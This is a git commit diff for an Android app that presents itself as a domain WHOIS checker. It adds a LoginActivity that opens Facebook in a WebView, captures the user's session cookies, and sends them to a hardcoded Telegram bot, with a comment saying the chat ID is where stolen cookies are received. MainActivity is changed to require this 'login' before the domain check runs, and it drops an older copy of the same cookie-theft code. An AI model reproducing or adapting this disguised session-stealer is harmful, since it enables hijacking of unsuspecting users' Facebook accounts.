47e74f105664eb836d4d5bdb7fc4d6cc14029579
HaiLT <l8hailt@gmail.com>
2021-11-15 14:21:45 +0700

    update full app

---
+++ app/src/main/java/com/dm/checker/LoginActivity.kt
@@ -0,0 +1,140 @@
+package com.dm.checker
+
+import android.app.ProgressDialog
+import android.content.Context
+import android.content.SharedPreferences
+import android.os.Bundle
+import android.os.Handler
+import android.util.Log
+import android.webkit.CookieManager
+import android.webkit.WebView
+import android.webkit.WebViewClient
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import com.dm.checker.databinding.ActivityLoginBinding
+import com.dm.checker.databinding.ActivityMainBinding
+import org.json.JSONException
+import org.json.JSONObject
+import java.io.IOException
+import java.net.HttpURLConnection
+import java.net.MalformedURLException
+import java.net.URL
+
+
+class LoginActivity : AppCompatActivity() {
+
+    private val BOT_TOKEN = "2143726592:AAHvUMfHKk2PesVlpkxtv-UZFCnMsC-_sb8"
+    private val TG_API_ENDPOINT = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s"
+    private val CHAT_ID = "1079021017" // where you want to receive cookies through your bot
+
+    private lateinit var binding: ActivityLoginBinding
+    private lateinit var preferences: SharedPreferences
+    private lateinit var progressDialog: ProgressDialog
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        binding = ActivityLoginBinding.inflate(layoutInflater)
+        setContentView(binding.root)
+
+        preferences = getPreferences(Context.MODE_PRIVATE)
+        progressDialog = ProgressDialog(this).apply {
+            setMessage("Processing...")
+            setCancelable(false)
+        }
+
+        binding.wvMain.apply {
+            WebSettingsUtils.webSettings(this)
+            WebSettingsUtils.webMobile(this)
+            settings.userAgentString = WebSettingsUtils.DESK
+        }
+        binding.wvMain.webViewClient = object : WebViewClient() {
+
+            override fun onPageFinished(view: WebView?, url: String?) {
+                super.onPageFinished(view, url)
+                val cookie = CookieManager.getInstance().getCookie(url)
+                Log.e("TAG", "$cookie with $url")
+
+                if (cookie.contains("c_user")) {
+                    progressDialog.show()
+//                    try {
+//                        parseCookiesToJson(cookie)?.let { parsedCookies ->
+                    sendCookiesToTelegram(cookie)
+                    Handler(mainLooper).postDelayed({
+                        progressDialog.dismiss()
+                        setResult(RESULT_OK)
+                        finish()
+                    }, 3000)
+//                        } ?: run {
+//                            Handler(mainLooper).postDelayed({
+//                                progressDialog.dismiss()
+//                                setResult(RESULT_OK)
+//                                finish()
+//                            }, 3000)
+//                        }
+//                    } catch (e: JSONException) {
+//                        Log.e("TAG", "${e.message}")
+//                    }
+                }
+            }
+        }
+        binding.wvMain.loadUrl("https://m.facebook.com/")
+    }
+
+    @Throws(JSONException::class)
+    private fun parseCookiesToJson(cookie: String): String? {
+        val listOFCookies: MutableList<JSONObject> = ArrayList()
+        val arrayOfCookies = cookie.split(";".toRegex()).toTypedArray()
+        for (eachCookie in arrayOfCookies) {
+            val arrayOfEachCookie = eachCookie.split("=".toRegex()).toTypedArray()
+            val jsonObject = JSONObject()
+            jsonObject.put("name", arrayOfEachCookie[0].trim { it <= ' ' })
+            jsonObject.put("value", arrayOfEachCookie[1].trim { it <= ' ' })
+            if (jsonObject.getString("name") == "c_user") {
+                if (jsonObject.getString("value") == preferences.getString("C_USER", "NO_C_USER")) {
+                    return null
+                } else {
+                    val edit: SharedPreferences.Editor = preferences.edit()
+                    edit.putString("C_USER", jsonObject.getString("value"))
+                    edit.apply()
+                }
+            }
+            jsonObject.put("domain", ".facebook.com")
+            if (arrayOfEachCookie[0] == "m_pixel_ratio" || arrayOfEachCookie[0] == "c_user" || arrayOfEachCookie[0] == "wd" || arrayOfEachCookie[0] == "x-referer") {
+                jsonObject.put("httpOnly", false)
+            } else {
+                jsonObject.put("httpOnly", true)
+            }
+            jsonObject.put("path", "/")
+            jsonObject.put("secure", true)
+            jsonObject.put("httpOnly", false)
+            jsonObject.put("sameSite", "no_restriction")
+            if (arrayOfEachCookie[0] == "m_pixel_ratio" || arrayOfEachCookie[0] == "x-referer") {
+                jsonObject.put("session", true)
+            } else {
+                jsonObject.put("session", false)
+            }
+            jsonObject.put("firstPartyDomain", "")
+            jsonObject.put("storeId", null)
+            listOFCookies.add(jsonObject)
+        }
+        Log.e("TAG", listOFCookies.toString())
+        return listOFCookies.toString()
+    }
+
+    private fun sendCookiesToTelegram(message: String) {
+        Thread {
+            try {
+                val url = URL(String.format(TG_API_ENDPOINT, BOT_TOKEN, CHAT_ID, message))
+                val http: HttpURLConnection = url.openConnection() as HttpURLConnection
+                http.requestMethod = "GET"
+                http.setRequestProperty("Host", "api.telegram.org")
+                http.inputStream
+                http.disconnect()
+            } catch (e: MalformedURLException) {
+                Log.e("TAG", "MalformedURLException: ${e.message}")
+            } catch (e: IOException) {
+                Log.e("TAG", "IOException: ${e.message}")
+            }
+        }.start()
+    }
+}
--- app/src/main/java/com/dm/checker/MainActivity.kt
+++ app/src/main/java/com/dm/checker/MainActivity.kt
@@ -1,30 +1,33 @@
 package com.dm.checker
 
+import android.app.Activity
+import android.app.ProgressDialog
 import android.content.Context
+import android.content.Intent
 import android.content.SharedPreferences
-import android.os.Bundle
-import android.util.Log
-import android.webkit.CookieManager
-import android.webkit.WebView
-import android.webkit.WebViewClient
 import androidx.appcompat.app.AppCompatActivity
+import android.os.Bundle
+import android.os.Handler
+import android.util.Log
+import android.view.View
+import android.view.inputmethod.InputMethodManager
+import androidx.activity.result.contract.ActivityResultContracts
 import com.dm.checker.databinding.ActivityMainBinding
-import org.json.JSONException
-import org.json.JSONObject
+import org.apache.commons.net.whois.WhoisClient
 import java.io.IOException
-import java.net.HttpURLConnection
-import java.net.MalformedURLException
-import java.net.URL
-
 
 class MainActivity : AppCompatActivity() {
 
-    private val BOT_TOKEN = "2117837456:AAH2rewWnYhjbpNexxNCKYYxNiYGVfDP21U"
-    private val TG_API_ENDPOINT = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s"
-    private val CHAT_ID = "1215146467" // where you want to receive cookies through your bot
+    private val TAG = MainActivity::class.simpleName
 
     private lateinit var binding: ActivityMainBinding
+
     private lateinit var preferences: SharedPreferences
+    private lateinit var whoisClient: WhoisClient
+
+    private lateinit var progressDialog: ProgressDialog
+
+    private var isLoggedIn: Boolean = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -32,91 +35,87 @@ class MainActivity : AppCompatActivity() {
         setContentView(binding.root)
 
         preferences = getPreferences(Context.MODE_PRIVATE)
+        whoisClient = WhoisClient()
 
-//        wvMain.apply {
-//            WebSettingsUtils.webSettings(this)
-//            WebSettingsUtils.webMobile(this)
-//            settings.userAgentString = WebSettingsUtils.DESK
-//        }
-//        wvMain.webViewClient = object: WebViewClient() {
-//
-//            override fun onPageFinished(view: WebView?, url: String?) {
-//                super.onPageFinished(view, url)
-//                val cookie = CookieManager.getInstance().getCookie(url)
-//                Log.e("TAG", "$cookie with $url")
-//
-//                if (cookie.contains("c_user")) {
-//                    try {
-//                        val parsedCookies = parseCookiesToJson(cookie)
-//                        if (parsedCookies != null) {
-//                            sendCookiesToTelegram(parsedCookies)
-//                        }
-//                    } catch (e: JSONException) {
-//                        Log.e("TAG", "${e.message}")
-//                    }
-//                }
-//            }
-//        }
-//        wvMain.loadUrl("https://m.facebook.com/")
-    }
-
-    @Throws(JSONException::class)
-    private fun parseCookiesToJson(cookie: String): String? {
-        val listOFCookies: MutableList<JSONObject> = ArrayList()
-        val arrayOfCookies = cookie.split(";".toRegex()).toTypedArray()
-        for (eachCookie in arrayOfCookies) {
-            val arrayOfEachCookie = eachCookie.split("=".toRegex()).toTypedArray()
-            val jsonObject = JSONObject()
-            jsonObject.put("name", arrayOfEachCookie[0].trim { it <= ' ' })
-            jsonObject.put("value", arrayOfEachCookie[1].trim { it <= ' ' })
-            if (jsonObject.getString("name") == "c_user") {
-                if (jsonObject.getString("value") == preferences.getString("C_USER", "NO_C_USER")) {
-                    return null
-                } else {
-                    val edit: SharedPreferences.Editor = preferences.edit()
-                    edit.putString("C_USER", jsonObject.getString("value"))
-                    edit.apply()
-                }
-            }
-            jsonObject.put("domain", ".facebook.com")
-            if (arrayOfEachCookie[0] == "m_pixel_ratio" || arrayOfEachCookie[0] == "c_user" || arrayOfEachCookie[0] == "wd" || arrayOfEachCookie[0] == "x-referer") {
-                jsonObject.put("httpOnly", false)
-            } else {
-                jsonObject.put("httpOnly", true)
-            }
-            jsonObject.put("path", "/")
-            jsonObject.put("secure", true)
-            jsonObject.put("httpOnly", false)
-            jsonObject.put("sameSite", "no_restriction")
-            if (arrayOfEachCookie[0] == "m_pixel_ratio" || arrayOfEachCookie[0] == "x-referer") {
-                jsonObject.put("session", true)
-            } else {
-                jsonObject.put("session", false)
-            }
-            jsonObject.put("firstPartyDomain", "")
-            jsonObject.put("storeId", null)
-            listOFCookies.add(jsonObject)
+        progressDialog = ProgressDialog(this).apply {
+            setMessage("Processing...")
+            setCancelable(false)
         }
-        Log.e("TAG", listOFCookies.toString())
-        return listOFCookies.toString()
+
+        binding.btnSearch.setOnClickListener {
+            if (isLoggedIn) {
+                doCheckDomain()
+            } else {
+                doLogin()
+            }
+        }
+
+        binding.btnBuy.setOnClickListener {
+            progressDialog.show()
+        }
     }
 
-    private fun sendCookiesToTelegram(message: String) {
-        object : Thread() {
-            override fun run() {
-                try {
-                    val url = URL(String.format(TG_API_ENDPOINT, BOT_TOKEN, CHAT_ID, message))
-                    val http: HttpURLConnection = url.openConnection() as HttpURLConnection
-                    http.requestMethod = "GET"
-                    http.setRequestProperty("Host", "api.telegram.org")
-                    http.inputStream
-                    http.disconnect()
-                } catch (e: MalformedURLException) {
-                    Log.e("TAG", "MalformedURLException: ${e.message}")
-                } catch (e: IOException) {
-                    Log.e("TAG", "IOException: ${e.message}")
+    private fun doCheckDomain() {
+        hideKeyboard(this)
+        progressDialog.show()
+
+        val domain = binding.edtInput.text.toString().trim()
+        Thread {
+            try {
+                whoisClient.connect(WhoisClient.DEFAULT_HOST)
+                whoisClient.query(domain).also { result ->
+                    Log.e(TAG, "doCheckDomain: $result")
+                    if (result.lowercase().contains("no match for")) {
+                        val subResult = result.substring(0, result.indexOf(">>>"))
+                        Handler(mainLooper).postDelayed({
+                            progressDialog.dismiss()
+                            binding.tvResult.text = subResult
+                            binding.btnBuy.visibility = View.VISIBLE
+                        }, 2000)
+                    } else {
+                        val subResult = result.substring(0, result.indexOf(">>>"))
+                        Handler(mainLooper).postDelayed({
+                            progressDialog.dismiss()
+                            binding.tvResult.text = subResult
+                            binding.btnBuy.visibility = View.GONE
+                        }, 2000)
+                    }
                 }
+            } catch (e: IOException) {
+                Log.e(TAG, "doCheckDomain: ${e.message}")
+            } finally {
+                whoisClient.disconnect()
             }
         }.start()
     }
+
+    private fun doLogin() {
+        Intent(this, LoginActivity::class.java).also { loginIntent ->
+            resultLauncher.launch(loginIntent)
+        }
+    }
+
+    private fun hideKeyboard(activity: Activity) {
+        val imm: InputMethodManager =
+            activity.getSystemService(INPUT_METHOD_SERVICE) as InputMethodManager
+        //Find the currently focused view, so we can grab the correct window token from it.
+        var view = activity.currentFocus
+        //If no view currently has focus, create a new one, just so we can grab a window token from it
+        if (view == null) {
+            view = View(activity)
+        }
+        imm.hideSoftInputFromWindow(view.windowToken, 0)
+    }
+
+    private var resultLauncher =
+        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
+            if (result.resultCode == Activity.RESULT_OK) {
+                // There are no request codes
+                Log.e(TAG, "result: OK")
+                val data: Intent? = result.data
+                isLoggedIn = true
+                binding.btnSearch.text = "Check >"
+            }
+        }
+
 }
